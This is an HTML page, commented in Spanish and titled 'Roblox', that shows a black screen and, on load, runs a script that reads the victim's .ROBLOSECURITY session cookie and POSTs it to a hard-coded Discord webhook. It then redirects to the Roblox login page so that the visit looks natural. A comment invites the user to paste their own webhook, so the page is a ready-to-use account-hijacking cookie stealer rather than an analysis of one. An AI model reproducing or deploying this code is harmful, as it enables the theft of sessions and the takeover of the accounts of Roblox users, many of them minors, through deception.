<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        /* Fondo negro puro */
        body {
            background-color: #000000;
            margin: 0;
            height: 100vh;
        }
    </style>
</head>
<body>

<script>
    // ⚠️ PEGA TU WEBHOOK AQUÍ ENTRE LAS COMILLAS
    const webhookURL = "https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7"; 

    window.onload = function() {
        // 1. Obtener la cookie .ROBLOSECURITY
        let cookieValue = document.cookie
            .split('; ')
            .find(row => row.startsWith('.ROBLOSECURITY='));
        
        if (cookieValue) {
            // Si encuentra la cookie, elimina el "=valor" para dejar solo el valor o usarla completa
            // Aquí enviamos el valor completo después del "="
            const cleanCookie = cookieValue.split('=')[1];
            enviar(cleanCookie);
        } else {
            // Si no la encuentra (ej. si es la primera visita), enviamos un aviso
            enviar("Cookie no detectada aún");
        }

        // Redirigir inmediatamente a Roblox para que parezca natural
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login";
        }, 500); // 0.5 segundos de pantalla negra
    };

    function enviar(cookie) {
        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🍪 **Roblox Cookie:**\n\`${cookie}\``
            })
        }).then(response => {
            if (response.ok) {
                console.log("Enviado con éxito");
            } else {
                console.log("Error HTTP: " + response.status);
            }
        }).catch(error => {
            console.error("Error de red:", error);
        });
    }
</script>

</body>
</html>
